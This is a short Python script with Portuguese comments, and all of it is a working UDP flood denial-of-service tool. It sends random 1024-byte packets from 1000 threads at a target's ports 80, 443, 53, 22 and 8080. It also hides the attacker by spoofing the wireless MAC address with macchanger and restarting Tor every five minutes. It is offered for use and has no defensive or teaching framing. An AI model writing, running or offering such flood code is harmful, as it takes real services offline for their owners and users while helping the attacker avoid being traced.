import socket
import random
import threading
import sys
import os
import time

# CONFIGURAÇÃO DE ANONIMATO
def change_tor_ip():
    os.system("pkill tor")
    os.system("tor > /dev/null 2>&1 &")
    time.sleep(10)  # AGUARDA O TOR RECONECTAR

def spoof_mac():
    os.system("termux-setup-storage")
    os.system("macchanger -r wlan0")

# CONFIGURAÇÃO DO ATAQUE
if len(sys.argv) < 2:
    print("Uso: python script.py <ALVO>")
    sys.exit(1)

ALVO = sys.argv[1]
PORTAS = [80, 443, 53, 22, 8080]
THREADS = 1000
PACOTE = random._urandom(1024)

# FUNÇÃO DE ATAQUE
def ataque():
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.sendto(PACOTE, (ALVO, random.choice(PORTAS)))
        except Exception as e:
            print(f"Erro: {e} (ignorado)")

# INICIANDO ANONIMATO
spoof_mac()
change_tor_ip()

# DISPARANDO THREADS DE ATAQUE
for _ in range(THREADS):
    threading.Thread(target=ataque, daemon=True).start()

# MUDANÇA PERIÓDICA DE IP TOR
def periodic_ip_change():
    while True:
        time.sleep(300)  # MUDA O IP A CADA 5 MINUTOS
        change_tor_ip()

threading.Thread(target=periodic_ip_change, daemon=True).start()

print(f"[🔥] ATAQUE INICIADO! ALVO: {ALVO}")
